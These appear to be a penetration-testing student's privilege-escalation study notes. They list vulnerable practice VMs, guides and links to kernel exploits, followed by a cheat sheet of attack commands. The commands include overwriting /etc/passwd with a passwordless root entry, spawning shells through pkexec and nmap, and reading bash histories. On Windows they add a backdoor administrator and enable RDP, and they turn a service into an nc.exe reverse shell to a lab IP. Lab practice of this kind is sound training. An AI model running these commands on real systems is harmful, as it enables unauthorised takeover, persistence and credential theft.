# Linux

### Beginner friendly

*   [Kioptrix: Level 1 (#1)](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
*   [Kioptrix: Level 1.1 (#2)](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)
*   [Kioptrix: Level 1.2 (#3)](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)
*   [Kioptrix: Level 1.3 (#4)](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)
*   [FristiLeaks: 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/)
*   [Stapler: 1](https://www.vulnhub.com/entry/stapler-1,150/)
*   [PwnLab: init](https://www.vulnhub.com/entry/pwnlab-init,158/)

### Intermediate

*   [Kioptrix: 2014](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)
*   [Brainpan: 1](https://www.vulnhub.com/entry/brainpan-1,51/)
*   [Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/)
*   [HackLAB: Vulnix](https://www.vulnhub.com/entry/hacklab-vulnix,48/)
*   [VulnOS: 2](https://www.vulnhub.com/entry/vulnos-2,147/)
*   [SickOs: 1.2](https://www.vulnhub.com/entry/sickos-12,144/)
*   [/dev/random: scream](https://www.vulnhub.com/entry/devrandom-scream,47/)
*   [pWnOS: 2.0](https://www.vulnhub.com/entry/pwnos-20-pre-release,34/)
*   [SkyTower: 1](https://www.vulnhub.com/entry/skytower-1,96/)
*   [IMF](https://www.vulnhub.com/entry/imf-1,162/)

* * *

# Windows

*   [Hack The Box](https://www.hackthebox.gr/en/login): Got a nice set of Windows machines from Windows 2000 up to Windows 8.1 I believe.
*   [Metasploitable 3](https://github.com/rapid7/metasploitable3/wiki), will download a trial version of Windows Server.
*   [https://github.com/magnetikonline/linuxmicrosoftievirtualmachines](https://github.com/magnetikonline/linuxmicrosoftievirtualmachines) you can download Windows VMs legally then hack your way through them through an unpatched vulnerability or setting up a vulnerable software.
*   Set up your own lab. Default Windows XP SP0 will give you the chance to try out a few remote exploits, or doing some privilege escalation using weak services.
*   [/dev/random: Sleepy](https://www.vulnhub.com/entry/devrandom-sleepy,123/) (Uses VulnInjector, need to provide you own ISO and key.)**[](https://www.vulnhub.com/entry/devrandom-sleepy,123/)**
*   [Bobby: 1](https://www.vulnhub.com/entry/bobby-1,42/) (Uses VulnInjector, need to provide you own ISO and key.)





Linux privesc step by step:

https://guif.re/linuxeop

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://github.com/TH3xACE/SUDO_KILLER



Windows privesc step by step:

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

http://www.fuzzysecurity.com/tutorials/16.html

https://guif.re/windowseop



Linux



Compile locally

gcc -o exp 9545.c -Wl,--hash-style=both



Read bash history:

echo: .bash_history

find -name ".bash_history" -exec cat {} \;



Override /etc/passwd:

-rwxrwxrwx. 1 root root 1306 Apr 21 2016 /etc/passwd

Echo root::0:0:root:/root:/bin/bash > /etc/passwd



Default checks:

find / -perm -u=s -type f 2>/dev/null



/usr/bin/pkexec su

pkexec python -c "import pty; pty.spawn('/bin/sh')"



sudo-l

cat /etc/exports



Kernel Exploits

Generic: https://github.com/lucyoa/kernel-exploits

FreeBSD 9.0: https://www.exploit-db.com/exploits/28718

Ubuntu 16.04: https://www.exploit-db.com/exploits/39772

Linux 2.6.9-89.EL: https://www.exploit-db.com/exploits/9545

Linux beta 3.0.0-12-generic: https://gist.github.com/karthick18/1686299

Linux core 2.6.32-21: https://www.exploit-db.com/exploits/14814/

Diverse unix: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/blob/master/2009/CVE-2009-2692/2.6.18.c & https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack

Diverse windows: https://github.com/jivoi/pentest/blob/master/exploit_win/win_local_exploits.md



Windows

Windows add new administrator

net user /add oscp attacker

net localgroup administrators oscp/add

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f



Authority/network service (asp.net shell)

Upload /usr/share/sqlninja/apps/churrasco.exe

churrasco -d "net user /add oscp oscp "

churrasco -d "net localgroup administrators oscp /add"

churrasco -d "NET LOCALGROUP "Remote Desktop Users" oscp/ADD"



Windows XP SP1 and earlier

sc config upnphost binpath= "C:\Inetpub\nc.exe -nv 10.11.0.128 5555 -e C:\Windows\system32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= ""

sc config upnphost depend= ""

sc qc upnphost

http://www.fuzzysecurity.com/tutorials/16.html





check application:

wmic_info.bat (http://www.fuzzysecurity.com/scripts/13.html)

nmap: sudo nmap –interactive --> !sh

mysql: https://github.com/amonsec/exploit/blob/master/linux/privs/MysqlUDF/mysql_udf_exploit.sh



MS16032 --> check optimum write up htb

Exploit suggester: https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester

https://github.com/amonsec/exploit/tree/master/windows/privs

checklist: https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
